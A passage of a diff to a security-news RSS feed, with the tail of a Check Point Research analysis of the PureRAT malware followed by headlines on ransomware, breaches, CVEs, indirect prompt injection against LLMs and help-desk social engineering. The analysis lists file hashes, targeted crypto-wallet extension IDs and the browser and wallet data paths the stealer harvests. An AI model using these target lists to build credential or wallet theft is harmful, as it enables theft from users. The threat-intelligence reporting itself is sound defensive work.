chromedriver.exe&lt;/td&gt;&lt;td&gt;2E5050C50D3A8E9F376F0AE9394CF265ED3DCF06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;GitHub &amp;#8211; msedgedriver.exe&lt;/td&gt;&lt;td&gt;7B133998E526B3BEE151329171C82CA1837C86F9&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;GitHub &amp;#8211; WebDriver.dll&lt;/td&gt;&lt;td&gt;39D3B6BEE5450D82D096AD7BDF4244FCB7B1EB81&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureRAT Builder&lt;/td&gt;&lt;td&gt;17E14B3CCF309FD9B5F7A5068A5CEDDD15FDEA0F &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="appendix"&gt;Appendix&lt;/h2&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="applications-extensions"&gt;Applications &amp;amp; Extensions&lt;/h3&gt;
+
+
+
+&lt;p&gt;Targeted Chromium extensions:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;ibnejdfjmmkpcnlpebklmnkoeoihofec - TronLink
+nkbihfbeogaeaoehlefnkodbefgpgknn - MetaMask
+fhbohimaelbohpjbbldcngcnapndodjp - Binance Chain Wallet
+ffnbelfdoeiohenkjibnmadjiehjhajb - Yoroi
+cjelfplplebdjjenllpjcblmjkfcffne - Jaxx Liberty
+fihkakfobkmkjojpchpfgcmhfjnmnfpi - BitApp Wallet
+kncchdigobghenbbaddojjnnaogfppfj - iWallet
+aiifbnbfobpmeekipheeijimdpnlpgpp - Terra Station
+ijmpgkjfkbfhoebgogflfebnmejmfbml - BitClip
+blnieiiffboillknjnepogjhkgnoapac - EQUAL Wallet
+amkmjjmmflddogmhpjloimipbofnfjih - Wombat
+jbdaocneiiinmjbjlgalhcelgbejmnid - Nifty Wallet
+afbcbjpbpfadlkmhmclhkeeodmamcflc - Math Wallet
+hpglfhgfnhbgpjdenjgmdgoeiappafln - Guarda
+aeachknmefphepccionboohckonoeemg - Coin98 Wallet
+imloifkgjagghnncjkhggdhalmcnfklk - Trezor Password Manager
+oeljdldpnmdbchonielidgobddffflal - EOS Authenticator
+gaedmjdfmmahhbjefcbgaolhhanlaolb - Authy
+ilgcnhelpchnceeipipijaljkblbcobl - GAuth Authenticator
+bhghoamapcdpbohphigoooaddinpkbai - Authenticator
+mnfifefkajgofkcjkemidiaecocnkjeh - TezBox
+dkdedlpgdmmkkfjabffeganieamfklkm - Cyano Wallet
+aholpfdialjgjfhomihkjbmgjidlcdno - Exodus Web3
+jiidiaalihmmhddjgbnbgdfflelocpak - BitKeep
+hnfanknocfeofbddgcijnmhnfnkdnaad - Coinbase Wallet
+egjidjbpglichdcondbcbdnbeeppgdph - Trust Wallet
+hmeobnfnfcmdkdcmlblgagmfpfboieaf - XDEFI Wallet
+bfnaelmomeimhlpmgjnjophhpkkoljpa - Phantom
+fcckkdbjnoikooededlapcalpionmalo - MOBOX WALLET
+bocpokimicclpaiekenaeelehdjllofo - XDCPay
+flpiciilemghbmfalicajoolhkkenfel - ICONex
+hfljlochmlccoobkbcgpmkpjagogcgpk - Solana Wallet
+cmndjbecilbocjfkibfbifhngkdmjgog - Swash
+cjmkndjhnagcfbpiemnkdpomccnjblmj - Finnie
+dmkamcknogkgcdfhhbddcghachkejeap - Keplr
+kpfopkelmapcoipemfendmdcghnegimn - Liquality Wallet
+hgmoaheomcjnaheggkfafnjilfcefbmo - Rabet
+fnjhmkhhmkbjkkabndcnnogagogbneec - Ronin Wallet
+klnaejjgbibmhlephnhpmaofohgkpgkd - ZilPay
+ejbalbakoplchlghecdalmeeeajnimhm - MetaMask
+ghocjofkdpicneaokfekohclmkfmepbp - Exodus Web3
+heaomjafhiehddpnmncmhhpjaloainkn - Trust Wallet
+hkkpjehhcnhgefhbdcgfkeegglpjchdc - Braavos Smart Wallet
+akoiaibnepcedcplijmiamnaigbepmcb - Yoroi
+djclckkglechooblngghdinmeemkbgci - MetaMask
+acdamagkdfmpkclpoglgnbddngblgibo - Guarda Wallet
+okejhknhopdbemmfefjglkdfdhpfmflg - BitKeep
+mijjdbgpgbflkaooedaemnlciddmamai - Waves Keeper&lt;/pre&gt;
+
+
+
+&lt;p&gt;Targeted Applications:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;Chromium - Chromium\\User Data\\
+Chrome - Google\\Chrome\\User Data\\
+Chrome - Google(x86)\\Chrome\\User Data\\
+Brave - BraveSoftware\\Brave-Browser\\User Data\\
+Edge - Microsoft\\Edge\\User Data\\
+QQBrowser - Tencent\\QQBrowser\\User Data\\
+ChromePlus - MapleStudio\\ChromePlus\\User Data\\
+Iridium - Iridium\\User Data\\
+7Star - 7Star\\7Star\\User Data\\
+CentBrowser - CentBrowser\\User Data\\
+Chedot - Chedot\\User Data\\
+Vivaldi - Vivaldi\\User Data\\
+Kometa - Kometa\\User Data\\
+Elements - Elements Browser\\User Data\\
+Epic Privacy - Epic Privacy Browser\\User Data\\
+Uran - uCozMedia\\Uran\\User Data\\
+Sleipnir5 - Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\
+Citrio - CatalinaGroup\\Citrio\\User Data\\
+Coowon - Coowon\\Coowon\\User Data\\
+liebao - liebao\\User Data\\
+QIP Surf - QIP Surf\\User Data\\
+Orbitum - Orbitum\\User Data\\
+Dragon - Comodo\\Dragon\\User Data\\
+Amigo - Amigo\\User\\User Data\\
+Torch - Torch\\User Data\\
+Comodo - Comodo\\User Data\\
+360Browser - 360Browser\\Browser\\User Data\\
+Maxthon3 - Maxthon3\\User Data\\
+K-Melon - K-Melon\\User Data\\
+Sputnik - Sputnik\\Sputnik\\User Data\\
+Nichrome - Nichrome\\User Data\\
+CocCoc - CocCoc\\Browser\\User Data\\
+Uran - Uran\\User Data\\
+Chromodo - Chromodo\\User Data\\
+Atom - Mail.Ru\\Atom\\User Data\\
+Atomic Wallet
+Bitcoin-Qt
+Dash-Qt
+Electrum
+Ethereum
+Exodus
+Jaxx
+Litecoin-Qt
+Zcash
+Foxmail
+Telegram
+Ledger Live&lt;/pre&gt;
+
+
+
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/"&gt;Under the Pure Curtain: From RAT to Builder to Coder&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31843</guid><category>Check Point Research Publications</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, September 16th, 2025 https://isc.sans.edu/podcastdetail/9614</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/09/upcoming-speaking-engagements-48.html</link><description>&lt;p&gt;This is a current list of where and when I am scheduled to speak:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;I’m speaking and signing books at the Cambridge Public Library on October 22, 2025 at 6 PM ET. The event is sponsored by Harvard Bookstore.&lt;/li&gt;
 &lt;li&gt;I’m giving a virtual talk about my book &lt;em&gt;Rewiring Democracy&lt;/em&gt; at 1 PM ET on October 23, 2025. The event is hosted by Data &amp;#38; Society. More details to come.&lt;/li&gt;
@@ -18424,38 +19388,7 @@ $RuntimeLastExecutionTime = Measure-Command {
 
 
 &lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/jsceal-targets-crypto-apps/"&gt;Sealed Chain of Deception: Actors leveraging Node.JS to Launch JSCeal&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31638</guid><category>Check Point Research Publications</category></item><item><title>How Microsoft defends against indirect prompt injection attacks</title><link>https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/</link><description>Summary The growing adoption of large language models (LLMs) in enterprise workflows has introduced a new class of adversarial techniques: indirect prompt injection. Indirect prompt injection can be used against systems that leverage large language models (LLMs) to process untrusted data. Fundamentally, the risk is that an attacker could provide specially crafted data that the LLM misinterprets as instructions.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/</guid></item><item><title>Gunra Ransomware Group Unveils Efficient Linux Variant</title><link>https://www.trendmicro.com/en_us/research/25/g/gunra-ransomware-linux-variant.html</link><description>This blog discusses how Gunra ransomware’s new Linux variant accelerates and customizes encryption, expanding the group’s reach with advanced cross-platform tactics.</description><guid isPermaLink="false">urn:uuid:0ea9fc9b-3a67-f5d6-6b69-c40330bc34f5</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>28th July – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/28th-july-threat-intelligence-report/</link><description>&lt;p&gt;For the latest discoveries in cyber research for the week of 28th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES The US Energy Department, including its National Nuclear Security Administration (NNSA), was reportedly breached as part of a Microsoft SharePoint vulnerability exploit. The breach was linked to a broader espionage campaign, that [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/28th-july-threat-intelligence-report/"&gt;28th July – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;For the latest discoveries in cyber research for the week of 28th July, please download our &lt;a href="https://research.checkpoint.com/wp-content/uploads/2025/07/Threat_Intelligence_News_2025-07-28-2.pdf"&gt;Threat Intelligence Bulletin&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The US Energy Department, including its National Nuclear Security Administration (NNSA), was reportedly &lt;a href="https://www.reuters.com/world/us/us-nuclear-weapons-agency-breached-microsoft-sharepoint-hack-bloomberg-news-2025-07-23/"&gt;breached&lt;/a&gt; as part of a Microsoft SharePoint vulnerability exploit. The breach was linked to a broader espionage campaign, that targeted government agencies via the CVE-2025-53770 The extent of the intrusion and data compromise at NNSA is unclear.&lt;/li&gt;
-&lt;li&gt;American tech company Dell has &lt;a href="https://www.bleepingcomputer.com/news/security/dell-confirms-breach-of-test-lab-platform-by-world-leaks-extortion-group/"&gt;confirmed&lt;/a&gt; a cyber attack that resulted in unauthorized access to its Customer Solution Centers product demonstration platform, with the threat actor exfiltrating 1.3 TB of primarily synthetic, publicly available, or Dell system data. The attack was carried out by the World Leaks extortion group, recently rebranded from Hunters International.&lt;/li&gt;
-&lt;li&gt;Insurance company Allianz Life has &lt;a href="https://www.bleepingcomputer.com/news/security/allianz-life-confirms-data-breach-impacts-majority-of-14-million-customers/"&gt;suffered&lt;/a&gt; a data breach that resulted in the exposure of personally identifiable information belonging to the majority of its 1.4 million customers, financial professionals, and select employees through a compromised cloud-based CRM system. The breach, attributed to the ShinyHunters group, involved the use of social engineering to access sensitive data.&lt;/li&gt;
-&lt;li&gt;Indian crypto company CoinDCX has &lt;a href="https://therecord.media/indian-crypto-dcx-millions-stolen"&gt;confirmed&lt;/a&gt; a cyber attack that resulted in the theft of over $44 million worth of cryptocurrency from one of its internal operational accounts. The incident did not affect customer wallets or user data, as only the company’s internal reserves in USDC and USDT stablecoins were stolen, traced to wallets holding $27.6 million and $16.2 million. No threat actor has claimed responsibility yet.&lt;/li&gt;
-&lt;li&gt;A cyber attack &lt;a href="https://www.msn.com/en-ca/health/other/data-breach-feared-after-cyberattack-on-ameos-hospitals-in-germany/ar-AA1IZSBz"&gt;targeting&lt;/a&gt; the AMEOS hospital network in Germany affected several hospital locations. While AMEOS has not confirmed whether sensitive medical data was exfiltrated, authorities, including data protection regulators, are currently investigating the scope of the breach.&lt;/li&gt;
-&lt;li&gt;Radiology Associates of Richmond confirmed it has &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/radiology-associates-of-richmond-confirms-data-breach-affecting-1-4-million-patients"&gt;suffered&lt;/a&gt; a data breach that resulted in unauthorized access to sensitive information. The attack compromised the personal and medical data, including protected health information and Social Security Numbers, of approximately 1.4 million individuals. No threat actor has claimed responsibility yet.&lt;/li&gt;
-&lt;li&gt;French national employment agency, France Travail, &lt;a href="https://www.bfmtv.com/tech/cybersecurite/france-travail-au-moins-340-000-demandeurs-d-emploi-victimes-d-un-nouveau-piratage_AV-202507230252.html"&gt;reported&lt;/a&gt; a data breach affecting around 340,000 job seekers after an attacker accessed its Kairos training platform via a compromised partner account. Exposed data includes names, contact details, and France Travail IDs.&lt;/li&gt;
-&lt;li&gt;French defense firm Naval Group is &lt;a href="https://actu.fr/normandie/cherbourg-en-cotentin_50129/naval-group-cible-par-une-cyberattaque-dampleur-des-donnees-sur-ses-sous-marins-derobes_62955177.html"&gt;investigating&lt;/a&gt; claims by a hacker who says they stole sensitive data on submarines and frigates, including source code. The threat actor allegedly leaked 30 GB and claims to hold up to 1 TB. Naval Group denies any system breach or ransom demand and is working with authorities to verify the claims.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Check Point Research &lt;a href="https://blog.checkpoint.com/research/sharepoint-zero-day-cve-2025-53770-actively-exploited-what-security-teams-need-to-know/"&gt;updated&lt;/a&gt; on the wide exploitation wave using a critical zero-day remote code execution vulnerability (CVE-2025-53770), affecting on-premises Microsoft SharePoint servers. deserialization. On July 24, Check Point Research found wide exploitation of the CVE, with more than 4600 compromise attempts on over 300 organizations, worldwide. While the initial exploitation wave was focused and targeted mostly government, software and telecommunications sectors, now it also targets financial services, business services and consumer goods sectors.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;((Microsoft SharePoint Server Insecure Deserialization (CVE-2025-49704, CVE-2025-49704), Microsoft SharePoint Server Authentication Bypass (CVE-2025-49706, CVE-2025-53771))&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Cisco has &lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6"&gt;released&lt;/a&gt; a patch for a critical remote code execution vulnerability (CVE-2025-20281, CVE-2025-20282, CVE-2025-20337) in its Identity Services Engine (ISE). The flaw allows unauthenticated attackers to execute arbitrary code remotely via crafted messages. Cisco urges immediate updates, noting there are no workarounds and that the flaw could pose a severe risk if left unpatched.&lt;/li&gt;
-&lt;li&gt;Sophos &lt;a href="https://www.sophos.com/en-us/security-advisories/sophos-sa-20250721-sfos-rce"&gt;released&lt;/a&gt; a patch for 5 vulnerabilities ranging from severities of medium to critical (CVE-2025-6704, CVE-2025-7624, CVE-2025-7382, CVE-2024-13974, CVE-2024-13973). The flaws include arbitrary file writing vulnerability in the Secure PDF eXchange, SQL injection vulnerability in the legacy SMTP proxy, command injection and SQL injection vulnerabilities in WebAdmin that can lead to code execution, and a business logic vulnerability in the Up2Date component that can lead to remote code execution.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong style="font-size: revert;"&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/research/phishing-trends-q2-2025-microsoft-maintains-top-spot-spotify-reenters-as-a-prime-target/"&gt;unveiled&lt;/a&gt; that phishing attackers in Q2 2025 predominantly impersonated the technology sector, with Microsoft accounting for 25% of brand impersonation attempts, followed by Google (11%), Apple (9%), and Spotify (6%), the latter reentering the top 10 for the first time since 2019. The report details a major Spotify credential-harvesting campaign that replicated the platform’s login page and a surge of over 700 Booking themed fake domains using personalized data to increase authenticity.&lt;/li&gt;
-&lt;li&gt;Researchers have &lt;a href="https://www.trendmicro.com/en_us/research/25/g/lumma-stealer-returns.html"&gt;analyzed&lt;/a&gt; the resurgence of Lumma Stealer, an information-stealing malware that rapidly re-emerged with stealthier evasion tactics following its infrastructure takedown in May 2025. They detail how operators shifted from widespread Cloudflare abuse to alternative hosting providers, particularly Russian ones, and diversified their delivery methods to include fake cracked software, GitHub repositories with AI-generated content, compromised websites deploying fake CAPTCHA (ClickFix campaigns), and social media distribution.&lt;/li&gt;
-&lt;li&gt;Researchers &lt;a href="https://www.lookout.com/threat-intelligence/article/lookout-discovers-iranian-dchsy-surveillanceware"&gt;uncovered&lt;/a&gt; a new Iranian spyware dubbed &amp;#8220;DCHsy&amp;#8221; used in targeted attacks against Android users, primarily in the Middle East. The spyware can harvest sensitive data, including location, call logs, and microphone recordings.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/28th-july-threat-intelligence-report/"&gt;28th July – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31639</guid><category>Global Cyber Attack Reports</category></item><item><title>NinjaOne Review: Features, Pricing, Pros &amp; Cons</title><link>https://www.techrepublic.com/article/ninjaone-review-features-pricing-pros-cons/</link><description>Find out why IT teams choose NinjaOne and if it’s the right endpoint management platform for you.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4318105</guid><category>Cloud Security</category></item><item><title>Revisiting UNC3886 Tactics to Defend Against Present Risk</title><link>https://www.trendmicro.com/en_us/research/25/g/revisiting-unc3886-tactics-to-defend-against-present-risk.html</link><description>We examine the past tactics used by UNC3886 to gain insight on how to best strengthen defenses against the ongoing and emerging threats of this APT group.</description><guid isPermaLink="false">urn:uuid:76709681-f25c-5167-b621-326c03dcbcf2</guid><category>Trend Micro Research : APT &amp; Targeted Attacks</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Unlocking the Power of Amazon Security Lake for Proactive Security</title><link>https://www.trendmicro.com/en_us/research/25/g/amazon-security-lake-proactive-security.html</link><description>Security is a central challenge in modern application development and maintenance, requiring not just traditional practices but also a deep understanding of application architecture and data flow. While organizations now have access to rich data like logs and telemetry, the real challenge lies in translating this information into actionable insights. This article explores how leveraging those insights can help detect genuine security incidents and prevent their recurrence.</description><guid isPermaLink="false">urn:uuid:b6aab75a-7bad-2d89-b137-a89fa325db6b</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Malware</category><category>Trend Micro Research : How To</category><category>Trend Micro Research : Phishing</category><category>Trend Micro Research : Compliance &amp; Risks</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Cyber Risk</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Deep Web</category><category>Trend Micro Research : Privacy &amp; Risks</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Risk Management</category><category>Trend Micro Research : APT &amp; Targeted Attacks</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Spam</category></item><item><title>The 8 Best Network Monitoring Tools for 2025</title><link>https://www.techrepublic.com/article/network-monitoring-software/</link><description>The best network monitoring tools include Zabbix, Datadog, and Cacti. Compare features, pricing, and supported platforms among our top picks.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3956047</guid><category>Cloud Security</category><category>Top Products</category><category>cacti</category><category>datadog</category><category>ManageEngine OpManager</category><category>Nagios XI</category><category>network monitoring</category><category>paessler prtg network monitor</category><category>Progress WhatsUp Gold</category><category>wireshark</category><category>zabbix</category></item><item><title>The 7 Best Encryption Software Choices in 2025</title><link>https://www.techrepublic.com/article/encryption-software/</link><description>This is a comprehensive list of the best encryption software and tools, covering their features, pricing and more. Use this guide to determine your best fit.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3959444</guid><category>Cloud Security</category><category>Security</category><category>Top Products</category><category>Advanced Encryption Package</category><category>AxCrypt Premium</category><category>bitlocker</category><category>Encryption software</category><category>ESET PROTECT Complete</category><category>nordlocker</category><category>Trend Micro Endpoint Encryption</category><category>veracrypt</category></item><item><title>Benefits of Adopting Zero-Trust Security</title><link>https://www.techrepublic.com/resource-library/feature/benefits-zero-trust-security/</link><description>This cybersecurity feature explores the positives of zero-trust security, and also looks at the challenges and how to overcome them. Constantly Updated — The download contains the latest and most accurate details. Boost Your Knowledge — The 10-page PDF explains a reduced attack surface, precise access control, and more. Expert Guidance — Created by Franklin ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/benefits-of-adopting-zero-trust-security/</guid><category>Cybersecurity</category><category>IT Resources</category></item><item><title>Proactive Email Security: The Power of AI</title><link>https://www.trendmicro.com/en_us/research/25/g/proactive-email-security.html</link><description>Lead with AI-powered email security to stay ahead of attackers and personalize user interaction at every touchpoint, bridging technology and behavior with precision.</description><guid isPermaLink="false">urn:uuid:be0305bf-727b-99c9-bed1-4b2abfc15be9</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Research</category></item><item><title>After $380M hack, Clorox sues its “service desk” vendor for simply giving out passwords</title><link>https://arstechnica.com/security/2025/07/how-do-hackers-get-passwords-sometimes-they-just-ask/</link><description>Massive 2023 hack was easily preventable, Clorox says.</description><content:encoded>&lt;p&gt;Hacking is hard. Well, sometimes.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/jsceal-targets-crypto-apps/"&gt;Sealed Chain of Deception: Actors leveraging Node.JS to Launch JSCeal&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31638</guid><category>Check Point Research Publications</category></item><item><title>How Microsoft defends against indirect prompt injection attacks</title><link>https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/</link><description>Summary The growing adoption of large language models (LLMs) in enterprise workflows has introduced a new class of adversarial techniques: indirect prompt injection. Indirect prompt injection can be used against systems that leverage large language models (LLMs) to process untrusted data. Fundamentally, the risk is that an attacker could provide specially crafted data that the LLM misinterprets as instructions.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/</guid></item><item><title>Gunra Ransomware Group Unveils Efficient Linux Variant</title><link>https://www.trendmicro.com/en_us/research/25/g/gunra-ransomware-linux-variant.html</link><description>This blog discusses how Gunra ransomware’s new Linux variant accelerates and customizes encryption, expanding the group’s reach with advanced cross-platform tactics.</description><guid isPermaLink="false">urn:uuid:0ea9fc9b-3a67-f5d6-6b69-c40330bc34f5</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>NinjaOne Review: Features, Pricing, Pros &amp; Cons</title><link>https://www.techrepublic.com/article/ninjaone-review-features-pricing-pros-cons/</link><description>Find out why IT teams choose NinjaOne and if it’s the right endpoint management platform for you.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4318105</guid><category>Cloud Security</category></item><item><title>Revisiting UNC3886 Tactics to Defend Against Present Risk</title><link>https://www.trendmicro.com/en_us/research/25/g/revisiting-unc3886-tactics-to-defend-against-present-risk.html</link><description>We examine the past tactics used by UNC3886 to gain insight on how to best strengthen defenses against the ongoing and emerging threats of this APT group.</description><guid isPermaLink="false">urn:uuid:76709681-f25c-5167-b621-326c03dcbcf2</guid><category>Trend Micro Research : APT &amp; Targeted Attacks</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Unlocking the Power of Amazon Security Lake for Proactive Security</title><link>https://www.trendmicro.com/en_us/research/25/g/amazon-security-lake-proactive-security.html</link><description>Security is a central challenge in modern application development and maintenance, requiring not just traditional practices but also a deep understanding of application architecture and data flow. While organizations now have access to rich data like logs and telemetry, the real challenge lies in translating this information into actionable insights. This article explores how leveraging those insights can help detect genuine security incidents and prevent their recurrence.</description><guid isPermaLink="false">urn:uuid:b6aab75a-7bad-2d89-b137-a89fa325db6b</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Malware</category><category>Trend Micro Research : How To</category><category>Trend Micro Research : Phishing</category><category>Trend Micro Research : Compliance &amp; Risks</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Cyber Risk</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Deep Web</category><category>Trend Micro Research : Privacy &amp; Risks</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Risk Management</category><category>Trend Micro Research : APT &amp; Targeted Attacks</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Spam</category></item><item><title>The 8 Best Network Monitoring Tools for 2025</title><link>https://www.techrepublic.com/article/network-monitoring-software/</link><description>The best network monitoring tools include Zabbix, Datadog, and Cacti. Compare features, pricing, and supported platforms among our top picks.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3956047</guid><category>Cloud Security</category><category>Top Products</category><category>cacti</category><category>datadog</category><category>ManageEngine OpManager</category><category>Nagios XI</category><category>network monitoring</category><category>paessler prtg network monitor</category><category>Progress WhatsUp Gold</category><category>wireshark</category><category>zabbix</category></item><item><title>The 7 Best Encryption Software Choices in 2025</title><link>https://www.techrepublic.com/article/encryption-software/</link><description>This is a comprehensive list of the best encryption software and tools, covering their features, pricing and more. Use this guide to determine your best fit.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3959444</guid><category>Cloud Security</category><category>Security</category><category>Top Products</category><category>Advanced Encryption Package</category><category>AxCrypt Premium</category><category>bitlocker</category><category>Encryption software</category><category>ESET PROTECT Complete</category><category>nordlocker</category><category>Trend Micro Endpoint Encryption</category><category>veracrypt</category></item><item><title>Benefits of Adopting Zero-Trust Security</title><link>https://www.techrepublic.com/resource-library/feature/benefits-zero-trust-security/</link><description>This cybersecurity feature explores the positives of zero-trust security, and also looks at the challenges and how to overcome them. Constantly Updated — The download contains the latest and most accurate details. Boost Your Knowledge — The 10-page PDF explains a reduced attack surface, precise access control, and more. Expert Guidance — Created by Franklin ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/benefits-of-adopting-zero-trust-security/</guid><category>Cybersecurity</category><category>IT Resources</category></item><item><title>Proactive Email Security: The Power of AI</title><link>https://www.trendmicro.com/en_us/research/25/g/proactive-email-security.html</link><description>Lead with AI-powered email security to stay ahead of attackers and personalize user interaction at every touchpoint, bridging technology and behavior with precision.</description><guid isPermaLink="false">urn:uuid:be0305bf-727b-99c9-bed1-4b2abfc15be9</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Research</category></item><item><title>After $380M hack, Clorox sues its “service desk” vendor for simply giving out passwords</title><link>https://arstechnica.com/security/2025/07/how-do-hackers-get-passwords-sometimes-they-just-ask/</link><description>Massive 2023 hack was easily preventable, Clorox says.</description><content:encoded>&lt;p&gt;Hacking is hard. Well, sometimes.&lt;/p&gt;
 &lt;p&gt;Other times, you just call up a company's IT service desk and pretend to be an employee who needs a password reset, an Okta multifactor authentication reset, and a Microsoft multifactor authentication reset... and it's done. Without even verifying your identity.&lt;/p&gt;
 &lt;p&gt;So you use that information to log in to the target network and discover a more trusted user who works in IT security. You call the IT service desk back, acting like you are now this second person, and you request the same thing: a password reset, an Okta multifactor authentication reset, and a Microsoft multifactor authentication reset. Again, the desk provides it, no identity verification needed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/07/how-do-hackers-get-passwords-sometimes-they-just-ask/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/07/how-do-hackers-get-passwords-sometimes-they-just-ask/#comments"&gt;Comments&lt;/a&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://arstechnica.com/security/2025/07/how-do-hackers-get-passwords-sometimes-they-just-ask/</guid><category>Security</category><category>Clorox</category><category>hacking</category><category>outsourcing</category><category>security</category></item><item><title>US Agencies Warn of Surging Interlock Ransomware Attacks Targeting Healthcare, Businesses</title><link>https://www.techrepublic.com/article/news-interlock-ransomware-healthcare-warning/</link><description>Federal agencies warn of rising Interlock ransomware attacks targeting healthcare and critical sectors using double extortion and advanced social engineering.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4318145</guid><category>Cloud Security</category><category>EU</category><category>Google</category><category>International</category><category>Microsoft</category><category>News</category><category>Open source</category><category>Security</category></item><item><title>1-15 February 2025 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2025/07/23/1-15-february-2025-cyber-attacks-timeline/</link><description>In the first timeline of February 